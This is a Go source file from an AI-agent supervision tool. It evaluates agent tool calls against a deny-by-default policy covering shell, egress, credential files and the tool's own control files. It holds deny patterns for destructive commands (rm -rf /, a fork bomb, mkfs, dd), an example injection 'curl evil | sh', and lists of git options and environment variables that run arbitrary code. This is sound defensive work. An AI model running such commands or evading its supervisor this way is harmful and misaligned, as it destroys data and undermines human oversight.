// Package policy implements deny-by-default policy gates at the tool-call
// boundary. It covers the "dangerous three" from the security brief:
// shell/exec, network egress, and credential use.
//
// Decisions are recorded on every span (policy_decision, policy_reason,
// policy_version) and in the audit trail. Policy files are versioned in git,
// diffable, reviewed like code.
package policy

import (
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"gopkg.in/yaml.v3"

	"github.com/calasdan-sketch/warden/internal/model"
	"github.com/calasdan-sketch/warden/internal/redact"
)

// Decision is the outcome of evaluating one span against policy.
type Decision int

const (
	// Allow lets the action proceed.
	Allow Decision = iota
	// Deny refuses the action with a human-readable reason.
	Deny
	// RequireApproval holds the action until a human decides (see store.Approvals).
	RequireApproval
)

func (d Decision) String() string {
	switch d {
	case Allow:
		return "allow"
	case Deny:
		return "deny"
	case RequireApproval:
		return "require_approval"
	}
	return "unknown"
}

// Result is a decided evaluation.
type Result struct {
	Decision Decision
	Reason   string // human-readable; always set on Deny/RequireApproval
	Version  string // policy version that decided
	// DefaultDeny is true when the only reason for a Deny is that the
	// command or host is not on an allowlist (the policy default), as
	// opposed to an explicit rule (deny pattern, deny_tools, operator
	// kill). Harness hooks use it to defer to the harness's own human
	// permission prompt instead of hard-blocking (see `warden hook`).
	DefaultDeny bool
}

// Policy is the loaded policy.yaml.
type Policy struct {
	Version int `yaml:"version"`

	Shell struct {
		Default      string   `yaml:"default"` // "deny" (default) or "allow"
		Allow        []string `yaml:"allow"`   // allowlisted command binaries
		DenyPatterns []string `yaml:"deny_patterns"`
		denyRe       []*regexp.Regexp
	} `yaml:"shell"`

	Egress struct {
		Default    string   `yaml:"default"` // "deny" (default) or "allow"
		AllowHosts []string `yaml:"allow_hosts"`
	} `yaml:"egress"`

	Files struct {
		// CredentialAdjacent is what happens on credential-adjacent file access:
		// "require_approval" (default), "deny", or "allow".
		CredentialAdjacent string `yaml:"credential_adjacent"`
	} `yaml:"files"`

	// DenyTools are always refused, everywhere (static list; the dynamic
	// deny-list pushed by kill --scope tool lives in the store).
	DenyTools []string `yaml:"deny_tools"`
	// ApprovalTools require a human approval before each call.
	ApprovalTools []string `yaml:"approval_tools"`

	denyToolsSet     map[string]bool
	approvalToolsSet map[string]bool

	// protected are warden's own control files (data dir, policy file):
	// set at runtime by Protect, never from YAML.
	protected []string
}

// Protect marks paths (warden's data dir, its policy file) as off-limits to
// supervised agents: any tool call that writes them, or any shell command
// that mentions them, is denied. Relative paths are ignored.
func (p *Policy) Protect(paths ...string) {
	for _, x := range paths {
		if x == "" {
			continue
		}
		if abs, err := filepath.Abs(x); err == nil {
			x = abs
		}
		p.protected = append(p.protected, filepath.Clean(x))
	}
}

// DenyList is the dynamic tool deny-list (kill --scope tool). Implemented by store.
type DenyList interface {
	IsToolDenied(tool, fleet string) (bool, string, error)
}

// DefaultYAML is the v1 default policy: deny-by-default on the dangerous three.
const DefaultYAML = `version: 1
shell:
  default: deny
  # Only commands that cannot run arbitrary code or reach the network.
  # Interpreters and build tools (python3, node, npm, go, make, …) run any
  # code they are given, and curl/wget move data past the egress policy, so
  # allowlisting them allowlists everything. Add them only if you accept that.
  allow: [git, ls, cat, echo, mkdir, pwd, head, tail, wc, grep, diff, sort, which]
  deny_patterns:
    - 'rm\s+-rf\s+/(?:\s|$)'
    - ':\(\)\{\s*:\|\:&\s*\};:'   # fork bomb
    - 'mkfs\.'
    - 'dd\s+.*of=/dev/'
egress:
  default: deny
  allow_hosts:
    - proxy.golang.org
    - api.anthropic.com
files:
  credential_adjacent: require_approval
deny_tools: []
approval_tools: [delete_bucket, drop_database, send_email]
`

// Default returns the default v1 policy.
func Default() (*Policy, error) { return Parse([]byte(DefaultYAML)) }

// Load reads a policy file; missing file falls back to Default().
func Load(path string) (*Policy, error) {
	b, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return Default()
		}
		return nil, err
	}
	return Parse(b)
}

// Parse parses policy YAML.
func Parse(b []byte) (*Policy, error) {
	var p Policy
	if err := yaml.Unmarshal(b, &p); err != nil {
		return nil, fmt.Errorf("parse policy: %w", err)
	}
	for _, pat := range p.Shell.DenyPatterns {
		re, err := regexp.Compile(pat)
		if err != nil {
			return nil, fmt.Errorf("bad shell deny pattern %q: %w", pat, err)
		}
		p.Shell.denyRe = append(p.Shell.denyRe, re)
	}
	p.denyToolsSet = map[string]bool{}
	for _, t := range p.DenyTools {
		p.denyToolsSet[strings.ToLower(t)] = true
	}
	p.approvalToolsSet = map[string]bool{}
	for _, t := range p.ApprovalTools {
		p.approvalToolsSet[strings.ToLower(t)] = true
	}
	return &p, nil
}

// shellTools are the tool names treated as shell/exec.
var shellTools = map[string]bool{
	"bash": true, "sh": true, "shell": true, "exec": true, "run_command": true, "terminal": true,
}

// Evaluator applies policy to spans.
type Evaluator struct {
	policy   *Policy
	denyList DenyList
}

// NewEvaluator builds an evaluator. denyList may be nil.
func NewEvaluator(p *Policy, denyList DenyList) *Evaluator {
	return &Evaluator{policy: p, denyList: denyList}
}

// Version returns the policy version string stamped on every decision.
func (e *Evaluator) Version() string { return fmt.Sprintf("%d", e.policy.Version) }

// Evaluate decides the fate of one span. It is pure except for the dynamic
// deny-list lookup; it never touches the network.
func (e *Evaluator) Evaluate(sp *model.Span) Result {
	ver := fmt.Sprintf("%d", e.policy.Version)
	switch sp.Kind {
	case model.SpanToolCall:
		return e.evalTool(sp, ver)
	case model.SpanNetEgress:
		return e.evalEgress(sp, ver)
	case model.SpanFileOp:
		return e.evalFile(sp, ver)
	default:
		// llm.call, subagent.spawn, human.approval: policy-neutral in v1.
		return Result{Decision: Allow, Version: ver}
	}
}

func (e *Evaluator) evalTool(sp *model.Span, ver string) Result {
	tool := strings.ToLower(sp.Tool)

	// 1. Dynamic deny-list (kill --scope tool) wins over everything.
	if e.denyList != nil {
		if denied, reason, err := e.denyList.IsToolDenied(sp.Tool, sp.FleetID); err == nil && denied {
			return Result{Decision: Deny, Reason: fmt.Sprintf("tool %q disabled by operator: %s", sp.Tool, reason), Version: ver}
		}
	}
	// 2. Static policy deny list.
	if e.policy.denyToolsSet[tool] {
		return Result{Decision: Deny, Reason: fmt.Sprintf("tool %q denied by policy (deny_tools)", sp.Tool), Version: ver}
	}
	// 3. Shell deny patterns: deny always wins, even over explicit approvals.
	if shellTools[tool] {
		cmd := shellCommand(sp)
		if reason := e.shellExplicitDeny(cmd); reason != "" {
			return Result{Decision: Deny, Reason: reason, Version: ver}
		}
		if p := e.protectedPathInCommand(cmd); p != "" {
			return Result{Decision: Deny,
				Reason:  fmt.Sprintf("command references warden/harness control file %q: denied (an agent must not touch its own supervisor)", p),
				Version: ver}
		}
		// Commands that touch credential-adjacent paths get the same
		// treatment as credential-adjacent file.op spans.
		if p := credentialPathInCommand(cmd); p != "" {
			switch e.policy.Files.CredentialAdjacent {
			case "deny":
				return Result{Decision: Deny,
					Reason:  fmt.Sprintf("command references credential-adjacent path %q: denied by policy", p),
					Version: ver}
			case "allow":
			default:
				return Result{Decision: RequireApproval,
					Reason:  fmt.Sprintf("command references credential-adjacent path %q: requires human approval", p),
					Version: ver}
			}
		}
	}
	// 4. Explicit approval gating beats the shell allowlist (explicit > default).
	if e.policy.approvalToolsSet[tool] {
		return Result{Decision: RequireApproval,
			Reason:  fmt.Sprintf("tool %q requires human approval (policy approval_tools)", sp.Tool),
			Version: ver}
	}
	// 5. Shell/exec: the dangerous one - deny by default against the allowlist.
	if shellTools[tool] {
		return e.evalShellAllow(sp, ver)
	}
	return Result{Decision: Allow, Version: ver}
}

// shellCommand returns the command text a shell span carries.
func shellCommand(sp *model.Span) string {
	if sp.ArgsSummary != "" {
		return sp.ArgsSummary
	}
	return sp.Name
}

// shellDenyMatch returns the first deny pattern matching the command, or nil.
func (e *Evaluator) shellDenyMatch(cmd string) *regexp.Regexp {
	for _, re := range e.policy.Shell.denyRe {
		if re.MatchString(cmd) {
			return re
		}
	}
	return nil
}

// shellExplicitDeny returns why a shell command is explicitly forbidden, or
// "". Deny patterns are matched against the raw line and against each
// simple command in normalized form (so "rm -r -f /" and "rm -fr /" meet a
// "rm -rf /" pattern); recursive force-deletes of / or $HOME are built in.
func (e *Evaluator) shellExplicitDeny(cmd string) string {
	if re := e.shellDenyMatch(cmd); re != nil {
		return fmt.Sprintf("shell command matches deny pattern %q", re.String())
	}
	for _, seg := range ShellSegments(cmd) {
		ci := ParseCommand(seg)
		norm := normalizeCommand(ci)
		if norm != "" {
			if re := e.shellDenyMatch(norm); re != nil {
				return fmt.Sprintf("shell command matches deny pattern %q (as %q)", re.String(), truncate(norm, 60))
			}
		}
		if ci.Bin == "rm" && rmRecursiveForce(ci.Args) {
			for _, a := range ci.Args {
				if rmRootTargets[strings.TrimRight(a, "/")+"/"] || rmRootTargets[a] {
					return fmt.Sprintf("recursive force-delete of %q is always denied", a)
				}
			}
		}
	}
	return ""
}

var rmRootTargets = map[string]bool{
	"/": true, "/*": true, "/.": true, "~": true, "~/": true, "~/*": true, "$HOME": true, "$HOME/": true,
	"${HOME}": true, "${HOME}/": true, "$HOME/*": true, "/home/": true, "/Users/": true, "/root/": true,
}

func rmRecursiveForce(args []string) bool {
	var r, f bool
	for _, a := range args {
		switch {
		case a == "--":
			return r && f
		case a == "--recursive":
			r = true
		case a == "--force":
			f = true
		case strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--"):
			r = r || strings.ContainsAny(a, "rR")
			f = f || strings.Contains(a, "f")
		}
	}
	return r && f
}

// normalizeCommand renders a parsed command canonically: wrappers dropped,
// and for rm the short/long flags merged into one "-rf" cluster.
func normalizeCommand(ci CommandInfo) string {
	if ci.Bin == "" {
		return ""
	}
	if ci.Bin == "rm" {
		var rest []string
		for _, a := range ci.Args {
			if !strings.HasPrefix(a, "-") || a == "-" {
				rest = append(rest, a)
			}
		}
		flags := ""
		if rmRecursiveForce(ci.Args) {
			flags = "-rf "
		}
		return "rm " + flags + strings.Join(rest, " ")
	}
	return ci.Bin + " " + strings.Join(ci.Args, " ")
}

// pathCandidate finds path-like substrings anywhere in a command, including
// inside quoted interpreter code ("open('/root/.ssh/id_rsa')") and after
// redirections (">~/.warden/policy.yaml").
var pathCandidate = regexp.MustCompile("[^\\s'\"(),;|&<>=`]+")

func commandPaths(cmd string) []string {
	var out []string
	for _, tok := range pathCandidate.FindAllString(cmd, -1) {
		tok = strings.TrimLeft(tok, "0123456789") // "2>file" leftovers
		if tok != "" {
			out = append(out, tok)
		}
	}
	return out
}

// harnessControlFiles are the hook/config files of supported harnesses:
// an agent that rewrites them can switch warden off.
var harnessControlFiles = []string{
	".claude/settings.json", ".claude/settings.local.json", "managed-settings.json",
	".codex/hooks.json", ".codex/config.toml",
}

// ProtectedPath reports whether path is one of warden's own control files
// (anything under a ".warden" dir, the configured data dir or policy file,
// receipt.key) or a harness hook config. kind is "warden" or "harness".
func (p *Policy) ProtectedPath(path string) (kind string, ok bool) {
	for _, cand := range redact.ExpandBraces(strings.ReplaceAll(path, `\`, "/"), 32) {
		if k, hit := p.protectedOne(cand); hit {
			return k, true
		}
	}
	return "", false
}

func (p *Policy) protectedOne(path string) (string, bool) {
	lower := strings.ToLower(path)
	for _, comp := range strings.Split(lower, "/") {
		if comp == ".warden" || (strings.ContainsAny(comp, "*?[") && globOK(comp, ".warden")) {
			return "warden", true
		}
	}
	base := filepath.Base(lower)
	if base == "receipt.key" || (strings.ContainsAny(base, "*?[") && globOK(base, "receipt.key")) {
		return "warden", true
	}
	expanded := expandHome(path)
	for _, pr := range p.protected {
		if expanded == pr || strings.HasPrefix(expanded, pr+"/") {
			return "warden", true
		}
		if strings.ContainsAny(expanded, "*?[") && globOK(expanded, pr) {
			return "warden", true
		}
	}
	for _, h := range harnessControlFiles {
		if lower == h || strings.HasSuffix(lower, "/"+h) || (strings.ContainsAny(lower, "*?[") && (globOK(lower, h) || globOK(filepath.Base(lower), filepath.Base(h)) && strings.Contains(lower, filepath.Dir(h)))) {
			return "harness", true
		}
	}
	return "", false
}

func globOK(pattern, name string) bool {
	ok, err := filepath.Match(pattern, name)
	return err == nil && ok
}

func expandHome(p string) string {
	home, _ := os.UserHomeDir()
	if home != "" {
		for _, pre := range []string{"~", "$HOME", "${HOME}"} {
			if p == pre || strings.HasPrefix(p, pre+"/") {
				p = home + p[len(pre):]
				break
			}
		}
	}
	if strings.HasPrefix(p, "/") {
		return filepath.Clean(p)
	}
	return p
}

// protectedPathInCommand returns the first protected path a command mentions.
func (e *Evaluator) protectedPathInCommand(cmd string) string {
	for _, tok := range commandPaths(cmd) {
		if _, ok := e.policy.ProtectedPath(tok); ok {
			return tok
		}
	}
	return ""
}

// evalShellAllow applies the shell allowlist / default after deny patterns
// and explicit approval gates have been checked.
func (e *Evaluator) evalShellAllow(sp *model.Span, ver string) Result {
	cmd := shellCommand(sp)
	if e.policy.Shell.Default == "allow" {
		return Result{Decision: Allow, Version: ver}
	}
	deny := func(format string, a ...any) Result {
		return Result{Decision: Deny, Reason: fmt.Sprintf(format, a...), Version: ver, DefaultDeny: true}
	}
	// Every command in a compound line must be allowlisted: an allowlisted
	// first binary must not smuggle "git status; curl evil | sh" through.
	for _, seg := range ShellSegments(cmd) {
		ci := ParseCommand(seg)
		if ci.Reject != "" {
			return deny("shell command %q: %s (policy default is deny)", truncate(cmd, 80), ci.Reject)
		}
		if ci.Bin == "" || safeBuiltins[ci.Bin] {
			continue
		}
		if !e.binaryAllowed(ci) {
			if strings.Contains(ci.Path, "/") {
				return deny("shell command %q runs %q by path; only allowlisted names (resolved via PATH) or exact allowlisted paths may run (policy default is deny)", truncate(cmd, 80), ci.Path)
			}
			return deny("shell command %q not allowlisted (binary %q; policy default is deny)", truncate(cmd, 80), ci.Bin)
		}
		if why := riskyInvocation(ci); why != "" {
			return deny("shell command %q: %s (policy default is deny)", truncate(cmd, 80), why)
		}
	}
	return Result{Decision: Allow, Version: ver}
}

// trustedBinDirs are system directories an unprivileged agent cannot write
// to; "/usr/bin/git" counts as "git". User-writable dirs (/usr/local/bin on
// macOS, /opt/homebrew/bin, ~/bin, /tmp, ./) never do.
var trustedBinDirs = map[string]bool{"/bin": true, "/usr/bin": true, "/sbin": true, "/usr/sbin": true}

func (e *Evaluator) binaryAllowed(ci CommandInfo) bool {
	for _, a := range e.policy.Shell.Allow {
		la := strings.ToLower(a)
		if strings.Contains(la, "/") {
			if ci.Path == a { // exact allowlisted path
				return true
			}
			continue
		}
		if ci.Bin != la {
			continue
		}
		if !strings.Contains(ci.Path, "/") {
			return true
		}
		if trustedBinDirs[filepath.Dir(ci.Path)] && filepath.Clean(ci.Path) == ci.Path {
			return true
		}
	}
	return false
}

// riskyInvocation flags known ways an allowlisted binary runs arbitrary
// code. It is a best-effort list for the default allowlist, not a sandbox.
func riskyInvocation(ci CommandInfo) string {
	switch ci.Bin {
	case "git":
		sub := ""
		for i, a := range ci.Args {
			la := strings.ToLower(a)
			switch {
			case a == "-c" || la == "--config" || strings.HasPrefix(la, "--config="),
				strings.HasPrefix(la, "--config-env"), strings.HasPrefix(la, "--exec-path"),
				strings.HasPrefix(la, "--upload-pack"), strings.HasPrefix(la, "--receive-pack"),
				la == "--exec" || strings.HasPrefix(la, "--exec="), strings.HasPrefix(la, "--extcmd"),
				strings.Contains(la, "ext::"):
				return fmt.Sprintf("git option %q can run arbitrary commands", a)
			case sub == "" && !strings.HasPrefix(a, "-"):
				if i > 0 && (ci.Args[i-1] == "-C" || ci.Args[i-1] == "--git-dir" || ci.Args[i-1] == "--work-tree" || ci.Args[i-1] == "--namespace") {
					continue // value of a global option
				}
				sub = la
			case sub == "clone" && a == "-u":
				return "git clone -u (--upload-pack) can run arbitrary commands"
			case sub == "rebase" && a == "-x":
				return "git rebase -x runs arbitrary commands"
			}
		}
		switch sub {
		case "config", "filter-branch", "filter-repo", "bisect", "submodule", "difftool", "mergetool",
			"daemon", "instaweb", "credential", "credential-store", "credential-cache", "alias", "hook":
			return fmt.Sprintf("git %s can change git configuration or run arbitrary commands", sub)
		}
	case "warden":
		return "an agent may not run warden itself (it could approve its own requests)"
	}
	return ""
}

// CommandInfo is one simple command, parsed.
type CommandInfo struct {
	Bin    string   // lower-cased base name of the program ("" when none)
	Path   string   // the program as written ("./git", "/usr/bin/git", "git")
	Args   []string // arguments after the program
	Reject string   // non-empty: the command must not be allowed (why)
}

// dangerousEnv reports environment variables that change which code a
// command runs (loader, interpreter, shell, git, editor and pager hooks).
func dangerousEnv(name string) bool {
	n := strings.ToUpper(name)
	switch n {
	case "PATH", "BASH_ENV", "ENV", "IFS", "SHELLOPTS", "BASHOPTS", "PS4", "PROMPT_COMMAND",
		"HOME", "XDG_CONFIG_HOME", "EDITOR", "VISUAL", "PAGER", "MANPAGER", "LESSOPEN", "LESSCLOSE",
		"BROWSER", "SSH_ASKPASS", "SUDO_ASKPASS", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "GOFLAGS",
		"CDPATH", "TMPDIR", "SHELL":
		return true
	}
	for _, pre := range []string{"LD_", "DYLD_", "GIT_", "WARDEN_", "PYTHON", "NODE_", "NPM_CONFIG_", "PERL", "RUBY", "BASH_FUNC_"} {
		if strings.HasPrefix(n, pre) {
			return true
		}
	}
	return false
}

func isAssignment(t string) (string, bool) {
	i := strings.IndexByte(t, '=')
	if i <= 0 {
		return "", false
	}
	name := strings.TrimSuffix(t[:i], "+") // VAR+=x appends
	for j, c := range name {
		if !(c == '_' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || j > 0 && c >= '0' && c <= '9') {
			return "", false
		}
	}
	return name, true
}

// sudo options that take a value, and ones that start a shell or editor.
var (
	sudoArgFlags   = map[byte]bool{'u': true, 'g': true, 'p': true, 'C': true, 'r': true, 't': true, 'U': true, 'D': true, 'R': true, 'T': true, 'h': false}
	sudoPlainFlags = map[byte]bool{'E': true, 'H': true, 'n': true, 'S': true, 'b': true, 'k': true, 'A': true, 'P': true, 'B': true, 'N': true}
	sudoLongArg    = map[string]bool{"--user": true, "--group": true, "--prompt": true, "--close-from": true, "--role": true, "--type": true, "--other-user": true, "--chdir": true, "--chroot": true, "--command-timeout": true, "--host": true}
	sudoLongPlain  = map[string]bool{"--preserve-env": true, "--set-home": true, "--non-interactive": true, "--stdin": true, "--background": true, "--reset-timestamp": true, "--askpass": true, "--preserve-groups": true, "--bell": true}
)

// ParseCommand parses one simple command (a ShellSegments element): it
// skips shell keywords, checks leading VAR=value assignments, unwraps env
// and sudo with exact flag parsing, and returns the program and its args.
// Anything it cannot parse exactly is rejected rather than guessed.
func ParseCommand(seg string) CommandInfo {
	toks := shellFields(seg)
	var ci CommandInfo
	i := 0
	checkAssign := func(t string) bool {
		name, ok := isAssignment(t)
		if ok && dangerousEnv(name) && ci.Reject == "" {
			ci.Reject = fmt.Sprintf("sets %s, which changes what code runs", name)
		}
		return ok
	}
	for i < len(toks) {
		t := toks[i]
		lt := strings.ToLower(t)
		switch {
		case shellKeywords[lt]:
			i++
			continue
		case checkAssign(t):
			i++
			continue
		case lt == "env":
			i++
			for i < len(toks) && strings.HasPrefix(toks[i], "-") {
				f := toks[i]
				switch {
				case f == "--":
					i++
					goto envDone
				case f == "-" || f == "-i" || f == "--ignore-environment" || f == "-0" || f == "--null" || f == "-v" || f == "--debug":
					i++
				case f == "-u" || f == "--unset" || f == "-C" || f == "--chdir":
					i += 2
				case strings.HasPrefix(f, "--unset=") || strings.HasPrefix(f, "--chdir="):
					i++
				default:
					ci.Reject = fmt.Sprintf("env option %q is not understood by warden (or re-parses its arguments)", f)
					return ci
				}
			}
		envDone:
			continue
		case lt == "sudo":
			i++
			for i < len(toks) && strings.HasPrefix(toks[i], "-") {
				f := toks[i]
				if f == "--" {
					i++
					break
				}
				if strings.HasPrefix(f, "--") {
					name, _, hasVal := strings.Cut(f, "=")
					switch {
					case sudoLongPlain[name]:
						i++
					case sudoLongArg[name] && hasVal:
						i++
					case sudoLongArg[name]:
						i += 2
					default:
						ci.Reject = fmt.Sprintf("sudo option %q is not allowed (it starts a shell, an editor, or is not understood)", f)
						return ci
					}
					continue
				}
				i++
				for k := 1; k < len(f); k++ {
					c := f[k]
					if sudoArgFlags[c] {
						if k == len(f)-1 {
							i++ // value is the next token
						}
						break // rest of this token is the value
					}
					if !sudoPlainFlags[c] {
						ci.Reject = fmt.Sprintf("sudo option -%c is not allowed (it starts a shell, an editor, or is not understood)", c)
						return ci
					}
				}
			}
			if i >= len(toks) {
				ci.Reject = "sudo without a command"
				return ci
			}
			continue
		}
		break
	}
	if i >= len(toks) {
		return ci
	}
	ci.Path = toks[i]
	base := ci.Path
	if j := strings.LastIndex(base, "/"); j >= 0 {
		base = base[j+1:]
	}
	ci.Bin = strings.ToLower(base)
	ci.Args = toks[i+1:]
	switch ci.Bin {
	case "export", "declare", "typeset", "readonly", "local":
		for _, a := range ci.Args {
			name, ok := isAssignment(a)
			if !ok && !strings.HasPrefix(a, "-") {
				name = a
			}
			if name != "" && dangerousEnv(name) {
				ci.Reject = fmt.Sprintf("%s %s changes what code runs", ci.Bin, name)
				return ci
			}
		}
	}
	return ci
}

// shellKeywords are reserved words that precede (or close) a command rather
// than name one; shellBinary skips them so "if git diff; then ls; fi" is
// judged by git and ls.
var shellKeywords = map[string]bool{
	"if": true, "then": true, "else": true, "elif": true, "fi": true,
	"do": true, "done": true, "while": true, "until": true, "!": true,
	"time": true, "{": true, "}": true, "esac": true,
}

// safeBuiltins are shell builtins that cannot run another program or touch
// the network by themselves; they never need to be allowlisted. (eval,
// exec, source and "." are deliberately absent.)
var safeBuiltins = map[string]bool{
	"exit": true, "true": true, "false": true, "cd": true, "pwd": true,
	"test": true, "[": true, "[[": true, ":": true, "set": true, "unset": true,
	"shift": true, "return": true, "wait": true,
	// Checked by ParseCommand for dangerous variables, then safe:
	"export": true, "declare": true, "typeset": true, "readonly": true, "local": true,
}

// maxShellDepth bounds recursion into nested "sh -c" / "$( )" bodies.
const maxShellDepth = 4

// ShellSegments splits a shell command line into the simple commands it
// runs: it splits on control operators (; & && | || newline) outside quotes,
// and extracts the bodies of command substitutions ($(...), backticks,
// <(...), >(...)) and of "sh -c" / "bash -c" style wrappers, recursively.
//
// It is quote-aware but is not a full shell parser: anything it cannot
// classify stays inside a segment whose first binary is still checked, so
// the error mode is a false deny, never a silent allow of a second command.
func ShellSegments(cmd string) []string {
	var out []string
	splitShell(cmd, 0, &out)
	return out
}

func splitShell(cmd string, depth int, out *[]string) {
	if depth > maxShellDepth {
		// Too deep to analyze: surface it as an unknown binary so the
		// allowlist check fails closed.
		*out = append(*out, "<nested-too-deep>")
		return
	}
	var cur strings.Builder
	flush := func() {
		seg := strings.TrimSpace(cur.String())
		cur.Reset()
		if seg == "" {
			return
		}
		*out = append(*out, seg)
		if inner := wrapperBody(seg); inner != "" {
			splitShell(inner, depth+1, out)
		}
	}
	var sq, dq bool
	rs := []rune(cmd)
	for i := 0; i < len(rs); i++ {
		c := rs[i]
		switch {
		case c == '\\' && !sq && i+1 < len(rs):
			cur.WriteRune(c)
			cur.WriteRune(rs[i+1])
			i++
		case c == '\'' && !dq:
			sq = !sq
			cur.WriteRune(c)
		case c == '"' && !sq:
			dq = !dq
			cur.WriteRune(c)
		case sq:
			cur.WriteRune(c)
		case c == '`':
			// Backtick substitution (also active inside double quotes).
			j := i + 1
			for j < len(rs) && rs[j] != '`' {
				j++
			}
			splitShell(string(rs[i+1:min(j, len(rs))]), depth+1, out)
			cur.WriteString("_")
			i = j
		case (c == '$' || c == '<' || c == '>') && i+1 < len(rs) && rs[i+1] == '(':
			// $( ), <( ), >( ): find the matching paren.
			lvl, j := 0, i+1
			for ; j < len(rs); j++ {
				if rs[j] == '(' {
					lvl++
				} else if rs[j] == ')' {
					lvl--
					if lvl == 0 {
						break
					}
				}
			}
			splitShell(string(rs[i+2:min(j, len(rs))]), depth+1, out)
			cur.WriteString("_")
			i = j
		case dq:
			cur.WriteRune(c)
		case c == '&' && ((i > 0 && (rs[i-1] == '>' || rs[i-1] == '<')) || (i+1 < len(rs) && rs[i+1] == '>')):
			// Redirection (2>&1, &>file, <&3), not a control operator.
			cur.WriteRune(c)
		case c == ';' || c == '&' || c == '|' || c == '\n' || c == '(' || c == ')':
			flush()
		default:
			cur.WriteRune(c)
		}
	}
	flush()
}

// wrapperBody returns the script passed to "sh -c", "bash -c", "zsh -c",
// "dash -c" (the first non-flag argument after -c), unquoted; "" otherwise.
func wrapperBody(seg string) string {
	switch shellBinary(seg) {
	case "sh", "bash", "zsh", "dash", "ksh":
	default:
		return ""
	}
	toks := shellFields(seg)
	for i, t := range toks {
		if strings.HasPrefix(t, "-") && strings.Contains(t, "c") && !strings.HasPrefix(t, "--") && i+1 < len(toks) {
			return toks[i+1]
		}
	}
	return ""
}

// shellFields splits on whitespace outside quotes and strips the quotes.
func shellFields(s string) []string {
	var out []string
	var cur strings.Builder
	var sq, dq, have bool
	for _, c := range s {
		switch {
		case c == '\'' && !dq:
			sq = !sq
			have = true
		case c == '"' && !sq:
			dq = !dq
			have = true
		case (c == ' ' || c == '\t') && !sq && !dq:
			if have {
				out = append(out, cur.String())
				cur.Reset()
				have = false
			}
		default:
			cur.WriteRune(c)
			have = true
		}
	}
	if have {
		out = append(out, cur.String())
	}
	return out
}

// credentialPathInCommand scans a shell command for tokens that look like
// credential-adjacent paths. Returns the first hit, or "".
func credentialPathInCommand(cmd string) string {
	for _, tok := range commandPaths(cmd) {
		if redact.IsCredentialAdjacentPath(tok) {
			return tok
		}
	}
	return ""
}

// shellBinary extracts the invoked binary from a command line: the first
// real token, with leading wrappers ("sudo -u dan", "env FOO=1") stripped.
func shellBinary(cmd string) string { return ParseCommand(cmd).Bin }

func (e *Evaluator) evalEgress(sp *model.Span, ver string) Result {
	if e.policy.Egress.Default == "allow" {
		return Result{Decision: Allow, Version: ver}
	}
	host := strings.ToLower(sp.Host)
	for _, h := range e.policy.Egress.AllowHosts {
		h = strings.ToLower(h)
		if host == h || strings.HasSuffix(host, "."+strings.TrimPrefix(h, "*.")) {
			return Result{Decision: Allow, Version: ver}
		}
	}
	return Result{Decision: Deny,
		Reason:      fmt.Sprintf("egress to %q denied: host not allowlisted (policy default is deny)", sp.Host),
		Version:     ver,
		DefaultDeny: true}
}

func (e *Evaluator) evalFile(sp *model.Span, ver string) Result {
	if kind, ok := e.policy.ProtectedPath(sp.Path); ok {
		// Harness configs may be read (harmless); warden's own files may
		// not even be read (receipt.key is the signing key).
		if !(kind == "harness" && sp.Op == "read") {
			return Result{Decision: Deny,
				Reason:  fmt.Sprintf("%s access to %s control file %q denied: an agent must not touch its own supervisor", nonEmptyOp(sp.Op), kind, sp.Path),
				Version: ver}
		}
	}
	if !redact.IsCredentialAdjacentPath(sp.Path) {
		return Result{Decision: Allow, Version: ver}
	}
	switch e.policy.Files.CredentialAdjacent {
	case "deny":
		return Result{Decision: Deny,
			Reason:  fmt.Sprintf("credential-adjacent file access denied: %s", sp.Path),
			Version: ver}
	case "allow":
		return Result{Decision: Allow, Version: ver}
	default: // require_approval
		return Result{Decision: RequireApproval,
			Reason:  fmt.Sprintf("credential-adjacent file %q requires human approval", sp.Path),
			Version: ver}
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func nonEmptyOp(op string) string {
	if op == "" {
		return "file"
	}
	return op
}
